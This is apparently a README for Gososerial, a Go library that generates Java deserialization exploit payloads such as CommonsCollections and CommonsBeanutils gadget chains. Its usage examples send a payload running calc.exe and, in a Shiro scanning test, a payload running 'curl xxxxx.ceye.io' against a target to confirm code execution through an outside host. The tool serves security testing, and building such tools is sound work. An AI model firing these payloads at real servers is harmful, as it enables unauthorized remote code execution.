# Gososerial

## 介绍

- ysoserial是java反序列化安全方面著名的工具
  
- 无需java环境，无需下载ysoserial.jar文件
  
- 输入命令直接获得payload，方便编写安全工具

- 目前已支持CC1-CC7，K1-K4和CB1

## Introduce

- Ysoserial is a well-known tool for Java deserialization security

- No Java environment and no need to download ysoserial.jar file

- Enter the command to directly obtain the payload, which is convenient for writing security tools

- Support CommonsCollections1-7,K1-K4,CommonsBeanutils1 Now

## Example

CommonsCollections1 Payload

![](https://github.com/EmYiQing/Gososerial/blob/master/img/1.png)


List of Supported

![](https://github.com/EmYiQing/Gososerial/blob/master/img/2.png)

## Quick Start

```shell
go get github.com/EmYiQing/Gososerial
```

```go
package main

import gososerial "github.com/EmYiQing/Gososerial"

func main()  {
	payload := gososerial.GetCC1("calc.exe")
	......
	sendPayload(payload)
	......
}
```

Example: Shiro Scan Code

```go
func TestFindShiro(t *testing.T) {
	......
	target := "http://192.168.222.132:8080/"
	key := shiro.CheckShiroKey(target)
	if key != "" {
		log.Info("find key: %s", key)
	}
	payload := gososerial.GetCC5("curl xxxxx.ceye.io")
	shiro.SendPayload(key, payload, target)
	if ceye.CheckResult("your_ceye_token") {
		log.Info("find shiro!")
	}
	......
}
```

## About

参考了xray中p师傅的代码

**ysoserial**: https://github.com/frohoff/ysoserial

**xray**: https://github.com/chaitin/xray

**phith0n**: https://github.com/phith0n
